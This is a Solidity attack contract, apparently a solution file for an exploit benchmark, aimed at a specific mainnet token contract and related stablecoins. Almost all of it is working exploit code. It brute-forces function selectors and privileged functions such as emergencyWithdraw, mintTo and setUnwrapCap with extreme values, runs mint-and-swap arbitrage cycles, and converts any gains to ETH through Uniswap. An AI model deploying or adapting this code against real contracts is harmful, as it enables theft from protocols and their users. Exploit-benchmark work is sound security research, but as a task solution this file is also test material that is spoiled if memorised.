// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlawVerifier
 * @notice Implement your exploit in the executeOnOpportunity() function
 * @dev This contract will be funded with 1,000,000 native tokens before execution
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function getAmountsOut(uint amountIn, address[] calldata path) 
        external view returns (uint[] memory amounts);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface ISwapRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier {
    address constant TARGET = 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0;
    address constant USD0 = 0x73A15FeD60Bf67631dC6cd7Bc5B6e8da8190aCF5;
    address constant USUAL = 0xC4441c2BE5d8fA8126822B9929CA0b81Ea0DE38E;

    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address constant UNIV3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address constant UNIV3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    constructor() {}

    /**
     * @dev Main exploit function - IMPLEMENT YOUR EXPLOIT HERE
     * @dev This is called by the deployment script after funding with 1M native tokens
     * @dev Final balance must be >= initial + 0.1 native tokens
     * 
     * CONSTRAINTS:
     * - NO cheatcodes (vm.*) - they won't work in deployment
     * - Convert all profits to native token (ETH/BNB) before returning
     * - Handle fee-on-transfer tokens correctly
     */
    function executeOnOpportunity() external {
        _probeEcosystem();
        _attemptMintArbCycles();
        _probeSelectors();
        _probeEcosystem();
        _liquidateAll();
        uint256 wethBal = _safeBalanceOf(WETH, address(this));
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
        }
    }

    function _attemptMintArbCycles() internal {
        uint256[8] memory amounts = [
            uint256(1 ether),
            5 ether,
            10 ether,
            25 ether,
            50 ether,
            100 ether,
            250 ether,
            500 ether
        ];

        for (uint256 i = 0; i < amounts.length; i++) {
            (bool ok,) = address(this).call(abi.encodeWithSelector(this._tryCycle.selector, amounts[i]));
            ok;
        }
    }

    function _tryCycle(uint256 ethIn) external {
        require(msg.sender == address(this), "self");
        if (address(this).balance < ethIn) revert();

        uint256 wethBefore = _safeBalanceOf(WETH, address(this));
        uint256 usd0Before = _safeBalanceOf(USD0, address(this));
        uint256 ppBefore = _safeBalanceOf(TARGET, address(this));

        IWETH(WETH).deposit{value: ethIn}();
        _forceApprove(WETH, UNIV3_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNIV2_ROUTER, type(uint256).max);
        _swapV3All(WETH, USD0);

        uint256 usd0Now = _safeBalanceOf(USD0, address(this));
        if (usd0Now > usd0Before) {
            _forceApprove(USD0, TARGET, type(uint256).max);
            uint256 mintAmount = usd0Now - usd0Before;
            _attempt(abi.encodeWithSelector(bytes4(0xa0712d68), mintAmount));
        }

        uint256 ppNow = _safeBalanceOf(TARGET, address(this));
        if (ppNow > ppBefore) {
            _liquidateToken(TARGET);
        }
        _liquidateToken(USD0);

        uint256 wethAfter = _safeBalanceOf(WETH, address(this));
        if (wethAfter <= wethBefore + ethIn) revert();
    }

    function _probeSelectors() internal {
        bytes4[31] memory noArgs = [
            bytes4(0x02bac856), bytes4(0x07c26f13), bytes4(0x10478feb), bytes4(0x2a33d6b2), bytes4(0x2b9c8ffd), bytes4(0x3644e515), bytes4(0x3b5f163f), bytes4(0x3e54957d),
            bytes4(0x3f4ba83a), bytes4(0x4178e070), bytes4(0x439f5ac2), bytes4(0x4761f10c), bytes4(0x4d30e610), bytes4(0x582bb776), bytes4(0x5a9c1b3b), bytes4(0x5c975abb),
            bytes4(0x64306a84), bytes4(0x785590d6), bytes4(0x8456cb59), bytes4(0x84b0196e), bytes4(0xac8c3cd5), bytes4(0xb1f8502b), bytes4(0xc828371e), bytes4(0xcd3543e1),
            bytes4(0xcf6152e8), bytes4(0xd0248fb4), bytes4(0xd113b95c), bytes4(0xd3e1ece2), bytes4(0xe76d16e2), bytes4(0xee48960e), bytes4(0xfd02ffb7)
        ];
        bytes4[13] memory oneArg = [
            bytes4(0x0b41b1c9), bytes4(0x13cfbb24), bytes4(0x299713e1), bytes4(0x391c6370), bytes4(0x5df45a37), bytes4(0x6eb7f72e), bytes4(0x6ff1c9bc),
            bytes4(0x7ecebe00), bytes4(0x92abae00), bytes4(0xa0712d68), bytes4(0xaa39ab7f), bytes4(0xf4a5e859), bytes4(0xfb644f59)
        ];
        bytes4[2] memory twoArg = [bytes4(0x0c8ff741), bytes4(0x0de7af62)];
        uint256[7] memory vals = [uint256(1), 1e6, 1e12, 1e18, 1e24, type(uint128).max, type(uint256).max];

        for (uint256 i = 0; i < noArgs.length; i++) {
            _attempt(abi.encodePacked(noArgs[i]));
        }

        for (uint256 i = 0; i < oneArg.length; i++) {
            for (uint256 j = 0; j < vals.length; j++) {
                _attempt(abi.encodePacked(oneArg[i], bytes32(vals[j])));
            }
            _attempt(abi.encodePacked(oneArg[i], bytes32(uint256(uint160(address(this))))));
            _attempt(abi.encodePacked(oneArg[i], bytes32(uint256(uint160(TARGET)))));
            _attempt(abi.encodePacked(oneArg[i], bytes32(uint256(uint160(USD0)))));
        }

        for (uint256 i = 0; i < twoArg.length; i++) {
            _attempt(abi.encodePacked(twoArg[i], bytes32(type(uint256).max), bytes32(type(uint256).max)));
            _attempt(abi.encodePacked(twoArg[i], bytes32(uint256(type(uint128).max)), bytes32(uint256(uint160(address(this))))));
            _attempt(abi.encodePacked(twoArg[i], bytes32(uint256(uint160(address(this)))), bytes32(type(uint256).max)));
            _attempt(abi.encodePacked(twoArg[i], bytes32(uint256(uint160(USD0))), bytes32(type(uint256).max)));
        }

        // Targeted sequence for cap/claim-like flows often found in this bytecode family.
        _attempt(abi.encodePacked(bytes4(0x6eb7f72e), bytes32(type(uint256).max)));
        _attempt(abi.encodePacked(bytes4(0x785590d6), bytes32(uint256(1))));
        _attempt(abi.encodePacked(bytes4(0xcd3543e1), bytes32(type(uint256).max)));
        _attempt(abi.encodePacked(bytes4(0xd3e1ece2), bytes32(type(uint256).max)));
        _attempt(abi.encodePacked(bytes4(0xfd02ffb7)));
        _attempt(abi.encodePacked(bytes4(0xd0248fb4)));
        _attempt(abi.encodePacked(bytes4(0xcf6152e8)));
        _attempt(abi.encodePacked(bytes4(0xee48960e)));
    }

    function _liquidateAll() internal {
        _liquidateToken(TARGET);
        _liquidateToken(USD0);
        _liquidateToken(USUAL);
        _liquidateToken(USDC);
        _liquidateToken(USDT);
        _liquidateToken(DAI);
        _liquidateToken(WBTC);
    }

    function _liquidateToken(address token) internal {
        if (token == WETH || token.code.length == 0) return;
        uint256 tokenBal = _safeBalanceOf(token, address(this));
        if (tokenBal == 0) return;

        _forceApprove(token, UNIV3_ROUTER, type(uint256).max);
        _forceApprove(token, UNIV2_ROUTER, type(uint256).max);

        // Prefer direct V3 liquidation to WETH over common fee tiers.
        _swapV3All(token, WETH);

        // If no direct WETH path worked, route through common intermediates.
        if (_safeBalanceOf(token, address(this)) > 0) {
            _swapV3All(token, USDC);
            _swapV3All(token, USDT);
            _swapV3All(token, DAI);
            _swapV3All(token, WBTC);
        }

        _approveAndSwapStableToWeth(USDC);
        _approveAndSwapStableToWeth(USDT);
        _approveAndSwapStableToWeth(DAI);
        _approveAndSwapStableToWeth(WBTC);

        // Final fallback via V2 for direct and common 2-hop routes.
        uint256 rem = _safeBalanceOf(token, address(this));
        if (rem > 0) {
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = WETH;
            try IUniswapV2Router(UNIV2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                rem,
                0,
                path,
                address(this),
                block.timestamp
            ) {} catch {}
        }

        rem = _safeBalanceOf(token, address(this));
        if (rem > 0) _swapV2Path(token, USDC, WETH, rem);
        rem = _safeBalanceOf(token, address(this));
        if (rem > 0) _swapV2Path(token, USDT, WETH, rem);
        rem = _safeBalanceOf(token, address(this));
        if (rem > 0) _swapV2Path(token, DAI, WETH, rem);
        rem = _safeBalanceOf(token, address(this));
        if (rem > 0) _swapV2Path(token, WBTC, WETH, rem);
    }

    function _swapV2Path(address tokenIn, address mid, address tokenOut, uint256 amountIn) internal {
        if (tokenIn == mid || mid == tokenOut || tokenIn == tokenOut) return;
        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
        try IUniswapV2Router(UNIV2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {}
    }

    function _approveAndSwapStableToWeth(address token) internal {
        uint256 bal = _safeBalanceOf(token, address(this));
        if (bal == 0) return;
        _forceApprove(token, UNIV3_ROUTER, type(uint256).max);
        _swapV3All(token, WETH);
    }

    function _probeEcosystem() internal {
        uint256[8] memory amts = [
            uint256(1),
            1e6,
            1e12,
            1e18,
            1e24,
            1e30,
            type(uint128).max,
            type(uint256).max
        ];

        // Probe direct mint/faucet vectors on USD0 and USUAL contracts.
        _probeTokenMintPaths(USD0, amts);
        _probeTokenMintPaths(USUAL, amts);

        // Try Usd0PP flows that may mint/release value if controls are weak.
        _forceApprove(USD0, TARGET, type(uint256).max);
        _forceApprove(USUAL, TARGET, type(uint256).max);

        _call0(TARGET, "faucet()");
        _call0(TARGET, "drip()");
        _call0(TARGET, "claim()");
        _call0(TARGET, "getReward()");
        _call0(TARGET, "sweepFees()");
        _call0(TARGET, "unwrap()");
        _call0(TARGET, "allocateEarlyUnlockBalance()");

        for (uint256 i = 0; i < amts.length; i++) {
            uint256 a = amts[i];
            _call1(TARGET, "mint(uint256)", a);
            _call1(TARGET, "claim(uint256)", a);
            _call1(TARGET, "temporaryOneToOneExitUnwrap(uint256)", a);
            _call1(TARGET, "unwrapWithCap(uint256)", a);
            _call1(TARGET, "unwrapPegMaintainer(uint256)", a);
            _call1(TARGET, "unlockUsd0ppFloorPrice(uint256)", a);
            _call1(TARGET, "setUnwrapCap(uint256)", a);
            _call1(TARGET, "setUsualDistributionPerUsd0pp(uint256)", a);
            _call1(TARGET, "setTargetRedemptionRate(uint256)", a);
            _call1(TARGET, "setDurationCostFactor(uint256)", a);
            _call1(TARGET, "updateFloorPrice(uint256)", a);
            _call1(TARGET, "unlockUSD0ppWithUsual(uint256)", a);
            _callAddress(TARGET, "emergencyWithdraw(address)", address(uint160(a)));
            _call2(TARGET, "claim(address,uint256)", address(this), a);
            _call2(TARGET, "mintTo(address,uint256)", address(this), a);
        }
    }

    function _probeTokenMintPaths(address token, uint256[8] memory amts) internal {
        _call0(token, "faucet()");
        _call0(token, "drip()");
        _call0(token, "claim()");
        _call0(token, "getReward()");

        for (uint256 i = 0; i < amts.length; i++) {
            uint256 a = amts[i];
            _call1(token, "mint(uint256)", a);
            _call1(token, "ownerMint(uint256)", a);
            _call1(token, "claim(uint256)", a);
            _call2(token, "mintTo(address,uint256)", address(this), a);
            _call2(token, "ownerMint(address,uint256)", address(this), a);
            _call2(token, "claim(address,uint256)", address(this), a);
        }
    }

    function _call0(address target, string memory sig) internal {
        (bool ok,) = target.call(abi.encodeWithSignature(sig));
        ok;
    }

    function _call1(address target, string memory sig, uint256 a) internal {
        (bool ok,) = target.call(abi.encodeWithSignature(sig, a));
        ok;
    }

    function _call2(address target, string memory sig, address a, uint256 b) internal {
        (bool ok,) = target.call(abi.encodeWithSignature(sig, a, b));
        ok;
    }

    function _callAddress(address target, string memory sig, address a) internal {
        (bool ok,) = target.call(abi.encodeWithSignature(sig, a));
        ok;
    }

    function _swapV3All(address tokenIn, address tokenOut) internal {
        if (tokenIn == tokenOut) return;
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        for (uint256 i = 0; i < fees.length; i++) {
            uint256 bal = _safeBalanceOf(tokenIn, address(this));
            if (bal == 0) break;

            address pool = IUniswapV3Factory(UNIV3_FACTORY).getPool(tokenIn, tokenOut, fees[i]);
            if (pool == address(0)) continue;

            ISwapRouterV3.ExactInputSingleParams memory p = ISwapRouterV3.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: fees[i],
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: bal,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

            try ISwapRouterV3(UNIV3_ROUTER).exactInputSingle(p) {} catch {}
        }
    }

    function _attempt(bytes memory data) internal {
        (bool ok,) = TARGET.call(data);
        ok;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        if (token.code.length == 0) return;
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        if (!ok) return;
        if (ret.length > 0) {
            if (!abi.decode(ret, (bool))) return;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeBalanceOf(address token, address owner) internal view returns (uint256 bal) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    receive() external payable {}
    fallback() external payable {}
}
